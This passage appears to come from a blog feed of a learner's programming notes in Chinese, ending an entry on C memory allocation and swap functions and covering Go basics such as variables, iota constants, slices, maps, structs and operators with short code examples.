class="hljs-number">0</span> ? man : woman;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chg=%d&quot;</span>, chg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//如果chg=man,打印0</span><br><span class="hljs-comment">//如果chg=woman,打印1</span><br></code></pre></td></tr></table></figure></li><li><p><code>3.14</code>是double 类型,<code>3.14f</code>是float类型</p></li><li><p>内存释放：只是将使用的部分的内存打上可回收的标记，还是可以修改内存所存的元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input n:&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><span class="hljs-type">int</span>* p = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">calloc</span>(n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-keyword">while</span> (i &lt; n)<br>&#123;<br>p[i++] = i;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; n)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p[i++]);<br>&#125;<br><span class="hljs-built_in">free</span>(p);<br>p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\Desktop\笔记\c\平常\C语言平常笔记.assets\image-20221209152359574.png" alt="image-20221209152359574"></p></li><li><p><code>mollioc calloc realloc</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* p=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">calloc</span>(n,size);<span class="hljs-comment">//n:有多少个连续的int,size:只指针对应的类型的大小</span><br><span class="hljs-type">int</span>* p1=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-type">int</span>* p=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">realloc</span>(p,n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//n:可用于改变内存（重新申请）</span><br></code></pre></td></tr></table></figure><p>使用<code>calloc</code>会自动初始化，<code>malloc</code>不会</p><p> 使用<code>realloc</code>有两种情况，小扩容，大扩容，小扩容是在原有的内存基础上扩容，大扩容会改变位置</p><p><img src="C:\Users\12414\Desktop\笔记\c\平常\C语言平常笔记.assets\image-20221209153159341.png" alt="image-20221209153159341"></p></li><li><p>自己的交换函数，不能交换地址，交换地址对应的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span> <span class="hljs-params">( <span class="hljs-type">int</span> *a,  <span class="hljs-type">int</span> *b )</span><br>&#123;<br><span class="hljs-type">int</span> p;<br>p=*a;<br>*a=*b;<br>*b=p;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>不能再自己的函数里面计算，数组的长度，因为，接受的是首地址</p></li><li><p>可以通过字写的程序计算，数组里面的字符（字符串特别适用，数字注意0）</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初始go</title>
    <link href="/2023/05/07/go/%E5%88%9D%E5%A7%8Bgo/"/>
    <url>/2023/05/07/go/%E5%88%9D%E5%A7%8Bgo/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="初始GO"><a href="#初始GO" class="headerlink" title="初始GO"></a>初始GO</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3><ol><li><p>一个项目只有一个包<code>main</code></p><p>而且在<code>main</code>里面有一个<code>func main</code></p></li></ol><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//单行注释</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="简单的程序"><a href="#简单的程序" class="headerlink" title="简单的程序"></a>简单的程序</h3><ol><li><p>小程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;awd&quot;</span><br>fmt.Println(name)<br>name = <span class="hljs-string">&quot;Awdawd&quot;</span><br>fmt.Println(name)<br><span class="hljs-keyword">var</span> Int <span class="hljs-type">int</span> = <span class="hljs-number">2</span><br>fmt.Println(Int, name)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>注意<code>Println</code>的不一样的用法</li></ul></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ol><li><p>声明变量</p><ul><li><p>定义单个变量</p><p><code>var 变量名 变量的类型</code></p><p><code>var 变量名</code></p><p><code>变量名 := </code></p></li><li><p>定义多个变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">var</span> (<br>name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;ad&quot;</span><br>Int  <span class="hljs-type">int</span>    = <span class="hljs-number">9</span><br>)<br>fmt.Println(name)<br>fmt.Println(Int, name)<br><br><span class="hljs-built_in">print</span>(Int)<br>&#125;<br></code></pre></td></tr></table></figure><p>注意var()用法</p></li><li><p>变量的初始值</p><p><code>go</code>语言可以为变量默认值 </p></li><li><p>自动推导</p><p>使用<code>变量名 :=</code>不用加<code>var</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>name := <span class="hljs-string">&quot;AWda&quot;</span><br>fmt.Println(name)<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>打印类型</p><p><code>%T</code>大写</p></li><li><p>打印地址</p><p><code>%p</code>小写  </p></li><li><p><code>_</code>给这个赋任何值都应该该被抛弃</p></li></ul></li><li><p>变量交换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">100</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span> = <span class="hljs-number">200</span><br>a, b = b, a<br>fmt.Println(a, b)<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>变量的作用域</p><ul><li>如果存在全局变量和局部变量，在函数里面优先使用局部变量</li></ul></li></ol><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ol><li><p>使用关键字<code>const</code></p></li><li><p>也可以使用自动推导</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> d, e, c = <span class="hljs-string">&quot;string&quot;</span>, <span class="hljs-number">3.14</span>, <span class="hljs-number">520</span><br><span class="hljs-keyword">const</span> a <span class="hljs-type">int</span> =<span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>iota</code> 常计数器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;haha&quot;</span><br>e<br>f = <span class="hljs-number">100</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br>fmt.Println(a, b, c, d, e, f, g, h, i)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>b&#x3D;1,c&#x3D;2</p><p>e&#x3D;haha会与上面的变量保持相同</p><p>g&#x3D;100同理</p><p>h&#x3D;7恢复计数</p><p>i&#x3D;8</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;haha&quot;</span><br>e<br>f = <span class="hljs-number">100</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br><span class="hljs-keyword">const</span> (<br>j = <span class="hljs-literal">iota</span><br>)<br>fmt.Println(a, b, c, d, e, f, g, h, i, j)<br><br>&#125;<br><br><span class="hljs-comment">//j=0;</span><br><span class="hljs-comment">//是一组新的const</span><br></code></pre></td></tr></table></figure><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/iota.png"></p></li></ol><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ol><li><p><code>bool</code></p><p>默认值为<code>false</code></p><p>打印格式是<code>%t</code></p></li><li><p>整形</p><ul><li><p>有符号整型：<code>int8</code>、<code>int16</code>、<code>int32</code>、<code>int64</code> 和 <code>int</code>。</p></li><li><p>无符号整型：<code>uint8</code>、<code>uint16</code>、<code>uint32</code>、<code>uint64</code> 和 <code>uint</code>。分别表示 8 位、16 位、32 位、64 位和字节长度的无符号整数。</p></li></ul></li><li><p>浮点型</p><ul><li><p>当规定输出的小数点时，go会四舍五入</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> float <span class="hljs-type">float32</span> = <span class="hljs-number">3.14</span><br><span class="hljs-keyword">var</span> float2 <span class="hljs-type">float32</span> = <span class="hljs-number">3.19</span><br>fmt.Printf(<span class="hljs-string">&quot;%f\t%f\n&quot;</span>, float, float2)<br>fmt.Printf(<span class="hljs-string">&quot;%.1f\t%.1f&quot;</span>, float, float2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">140000</span>        <span class="hljs-number">3</span>.<span class="hljs-number">190000</span><br><span class="hljs-attribute">3</span>.<span class="hljs-number">1</span>     <span class="hljs-number">3</span>.<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>部分类型的别名</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%E9%83%A8%E5%88%86%E5%88%AB%E5%90%8D.png"></p></li><li><p>string</p><ul><li><p>使用%s打印</p></li><li><p>字符串拼接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span> = <span class="hljs-string">&quot;AWDawd&quot;</span><br>fmt.Println(str+<span class="hljs-string">&quot;awd&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>和C一样的转义字符</p></li><li><p>数据类型的转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">3</span><br>b := <span class="hljs-number">3.14</span><br>fmt.Println((<span class="hljs-type">float64</span>(a) + b))<br><span class="hljs-comment">//将a转换为float64</span><br><br><br><br>c:=<span class="hljs-type">float64</span>(<span class="hljs-type">int</span>(<span class="hljs-type">float64</span>(a)))<br><span class="hljs-built_in">println</span>(c)<br></code></pre></td></tr></table></figure><ul><li>整形，浮点型不能转成bool</li></ul></li><li><p>切片</p><ul><li><p><code>append()</code>向切片添加</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> ints []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br>fmt.Printf(<span class="hljs-string">&quot;before\n&quot;</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>fmt.Println(v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;after&quot;</span>)<br>ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2</span>)<br>ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2312</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>fmt.Println(v)<br>&#125;<br><br>b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-built_in">copy</span>(b, ints)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> b &#123;<br>fmt.Println(v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>map</p><ul><li><p>创建<br><code>a:=make(map[key]value)</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br>a[<span class="hljs-string">&quot;noe&quot;</span>] = <span class="hljs-number">1</span><br>a[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(v)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>读取</p><p><code>v, ifHava := a[&quot;three&quot;]</code></p><ul><li>v代表了值</li><li>ifHava 类型是bool看是否存在</li><li></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br>a[<span class="hljs-string">&quot;noe&quot;</span>] = <span class="hljs-number">1</span><br>a[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(v)<br>&#125;<br>v, ifHava := a[<span class="hljs-string">&quot;three&quot;</span>]<br><span class="hljs-keyword">if</span> ifHava == <span class="hljs-literal">true</span> &#123;<br>fmt.Println(v)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;NO&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>删除</p><p><code>delete(a, &quot;one&quot;)</code></p><p><code>a</code>是一个<code>map</code></p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> a &#123;<br>sum += i<br>&#125;<br><br>fmt.Println(sum)<br><br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>&#125;<br><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Println(k, v)<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>for range </p><p>前面的相当于下标，所以直接是key</p></li></ul></li></ul></li><li><p>结构体</p><ul><li><p>起别名+创建结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 起别名</span><br><span class="hljs-keyword">type</span> chg <span class="hljs-type">int</span><br>      <br><span class="hljs-comment">// 定义一个结构体</span><br><span class="hljs-keyword">type</span> zjy <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    high <span class="hljs-type">float64</span><br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">changeZjy</span><span class="hljs-params">(test *zjy)</span></span> &#123;<br>    test.high = <span class="hljs-number">1.5</span><br>    test.name = <span class="hljs-string">&quot;zjy is big pig&quot;</span><br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> int1 chg = <span class="hljs-number">2</span><br>    fmt.Println(int1)<br>    fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, int1)<br>      <br>    <span class="hljs-keyword">var</span> test zjy<br>    test.high = <span class="hljs-number">2.4</span><br>    test.name = <span class="hljs-string">&quot;zjy&quot;</span><br>    fmt.Println(test)<br>      <br>    changeZjy(&amp;test)<br>    fmt.Println(test)<br>&#125;<br>      <br>      <br></code></pre></td></tr></table></figure></li></ul></li><li><p>将结构体变换类</p><ul><li>注意<ul><li>记得在外挂函数的时候传指针</li><li>声明结构体，记得通过大小写来限定权限</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>high <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> setName(name <span class="hljs-type">string</span>) &#123;<br>this.name = name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> getName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> this.name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> Show() &#123;<br>fmt.Println(*this)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> zjy Person<br>zjy.setName(<span class="hljs-string">&quot;zjy&quot;</span>)<br>fmt.Println(zjy.getName())<br>fmt.Println(zjy.name)<br>zjy.Show()<br>zjy.age = <span class="hljs-number">20</span><br>zjy.high = <span class="hljs-number">1.5</span><br>zjy.Show()<br>fmt.Println(zjy)<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><ol><li>基本的都和C语言一样，下面是不一样的</li><li>自增自减只有<code>i++</code>，<code>i--</code></li></ol><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ol><li>和C语言一样</li></ol><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol><li>C语言一样</li></ol><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><ol><li><p><code>&amp;</code>两个二进制数对应都为1，才为1</p><p>相当于和</p></li><li><p><code>|</code>只要有1，就为 1 </p><p>相当于或</p></li><li><p>打印二进制（b是二进制的缩写）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Printf(<span class="hljs-string">&quot;%b&quot;</span>, b)<br></code></pre></td></tr></table></figure></li><li><p><code>^</code>不同为<code>1</code>，相同为<code>0</code>  </p></li><li><p><code>&lt;&lt; n</code>左移n位</p></li><li><p><code>&gt;&gt; n</code>右移n位</p></li></ol><h3 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h3><p>使用<code>fmt</code>里面的<code>scan</code>等</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Printf(<span class="hljs-string">&quot;input:&quot;</span>)<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span><br>fmt.Scan(&amp;a, &amp;str, &amp;b)<br><br><span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;+&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a+b:&quot;</span>, a+b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;-&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a-b:&quot;</span>, a-b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;*&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a*b:&quot;</span>, a*b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;/&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a/b:&quot;</span>, <span class="hljs-type">float64</span>(a/b))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;input error&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="选择语句"><a href="#选择语句" class="headerlink" title="选择语句"></a>选择语句</h3><p><code>if-else</code></p><p>注意不加小括号</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 